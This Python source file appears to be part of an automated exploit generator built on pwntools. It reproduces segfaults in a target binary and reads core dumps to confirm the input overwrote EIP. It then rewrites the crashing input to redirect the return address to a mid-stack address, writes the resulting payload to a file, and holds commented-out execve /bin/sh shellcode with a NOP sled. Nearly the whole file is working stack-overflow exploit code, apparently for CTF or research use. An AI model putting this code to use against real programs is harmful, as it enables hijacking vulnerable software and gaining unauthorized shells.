from pwn import *
from utils import build_command, interactive_gdb
from exploit_utils import ENV_VARS
import argparse
import glob
import tempfile


def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
    """
    Validates that the input causes a memory corruption crash by reproducing that crash.

    Parameters:
    crash_input: Initial input that will cause a memory corruption crash.
    target_bin: The binary file we want to explore and exploit.

    Returns:
    bool: True if the program crashes with a segmentation fault.
    """

    #clear the /core_dumps directory for a clean start
    subprocess.Popen(
        'rm /core_dumps/*', 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE,
        shell=True
    )

    target_bin = arg_config.target

    command = build_command(arg_config, crash_input)


    rep_proc = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        env={**os.environ, **ENV_VARS}
    )

    #sending the crash input from stdin to all targets
    rep_proc.communicate(input=crash_input)

    if rep_proc.returncode == -11:  #segfault
        core_path = f"/core_dumps/core.{target_bin}.{rep_proc.pid}"

        if os.path.isfile(core_path):
            os.remove(core_path)
            return True

        else:
            logging.error("Core dump is missing; Something went wrong.")
            sys.exit(1)

    else:
        logging.error("No memory corruption crash detected")
        sys.exit(1)


def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
    """
    Triggers a test crash with the given input and extracts information from the resulting core dump.
    Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
    the return address, causing EIP hijacking.

    Parameters:
    crash_input: The payload input that potentially overwrites the return address of the vulnerable function.
    target_bin: The binary file we want to explore and exploit.

    Returns:
    bool: True if the payload successfully reached and affected the return address.
    """

    #performs the crash 
    target_bin = arg_config.target

    command = build_command(arg_config, crash_input)

    crash_proc = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        env={**os.environ, **ENV_VARS}  #env={**os.environ, **ENV_VARS} => merges the current env variables with the additional ENV_VARS
    )
    
    #sending the crash input from stdin to all targets
    # print(f'in root cause analysis, sending the input: {crash_input}')
    crash_proc.communicate(input=crash_input)

    if crash_proc.returncode != -11:  #if the mutation did not cause a crash
        logging.error('in root cause analysis, payload mutation did not cause a crash for some reason. Investigating...')
        # interactive_gdb(target_bin, ENV_VARS)
        # sys.exit(1)
        #return none when the input does not lead to a crash
        return None

    core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
    core_path = f"/core_dumps/core.{target_bin}.{crash_proc.pid}"

    if core_path not in core_files:
        logging.error('in root cause analysis, previous crash did not cause a core dump')
        sys.exit(1)
    
    core = Corefile(core_path)
    eip = core.eip.to_bytes(4, byteorder='little')

    #if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
    if eip in crash_input:    
        return True

    #eip still has a valid value, so it wasn't overwritten by the payload. The program prematurely crashed and it did not reach the return address
    else:
        return False


def crash_explorer(crash_input: bytes, arg_config: argparse.Namespace):
    """
    Extracts information from the core dump from the previous crash and mutates the crashing input, 
    returns the mutated input to the root_cause_analysis for further crash testing.
    """

    #this explorer only works for june with aslr off for the time being
    payload_mutation = None

    core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
    core_path = core_files[-1]

    core = Corefile(core_path)
    eip = core.eip.to_bytes(4, byteorder='little')
    print(f'value of eip: {eip} ')
    for register in core.registers:

        reg_value = core.registers[register].to_bytes(4, byteorder='little')

        if reg_value in crash_input:
            print(f'{register} crashed with input bytes {reg_value}')

            #strategy on picking valid addresses that will later align with the jump addr??????
            stack_addr = (core.stack.start + core.stack.stop) // 2
            stack_addr += 4
            # print(f'stack base: {stack_base}, stack limit: {stack_limit}, stack middle: {hex(middle)}')
            # target = b'\xd0\xd0\xff\xff'
            target = struct.pack("<I", stack_addr)
            print(f'target: {target}')

            payload_mutation = crash_input.replace(reg_value, target)
            # print(f'payload mutation {payload_mutation}')


    print(f'payload mutation {payload_mutation}')
    return payload_mutation


def payload_builder(crash_input: bytes, target_bin: str) -> None:
    """
    Generates the final payload (byte sequence) for the exploitation process and writes it to a file.
    Overwrites the bytes that fall on the return address with a valid target address on the existing crash input, 
    appends a nopsled and finally the shellcode.

    Parameters:
    crash_input: Input that previously crashed the target binary by successfully overwriting the return address.
    target_bin: The binary file we want to exploit.

    """

    target_address = target_ra(target_bin)
    # shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    payload = overwrite_ra(crash_input, target_bin, struct.pack("<I", target_address))
    # payload += b'\x90' * 129000
    # payload += shellcode

    open("payload", "wb").write(payload)

    return


def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes) -> bytes:
    """
    Rewrites a crashing input to replace the return address for EIP hijacking. 
    The function extracts the EIP from a core dump, verifies it is present in the input, 
    and replaces it with the target return address.

    Parameters:
    crash_input: Input that previously crashed the target binary by successfully overwriting the return address.
    target_bin: The binary file we want to exploit.
    target_ra: The new return address to overwrite.
    """

    core_files = glob.glob(f'/core_dumps/core.{target_bin}.*')
    core_files = sorted(core_files, key=os.path.getmtime)

    core_path = core_files[-1]

    core = Corefile(core_path)
    eip = core.eip.to_bytes(4, byteorder='little')

    if eip not in crash_input:
        logging.error('we have a problem')
    
    payload = crash_input.replace(eip, target_ra)

    return payload


def target_ra(target_bin: str) -> int:

    #find in what adresses the stack fluctuates -> info proc mapping

    core_files = glob.glob(f'/core_dumps/core.{target_bin}.*')
    core_path = core_files[-1]

    core = Corefile(core_path)

    # print(f"Stack Base: {hex(core.stack.start)}")
    # print(f"Stack Top: {hex(core.stack.stop)}")

    stack_base = core.stack.start
    stack_limit = core.stack.stop
    middle = (stack_base + stack_limit) // 2
    middle += 4

    # print(f'core mappings: {core.stack}')

    return middle
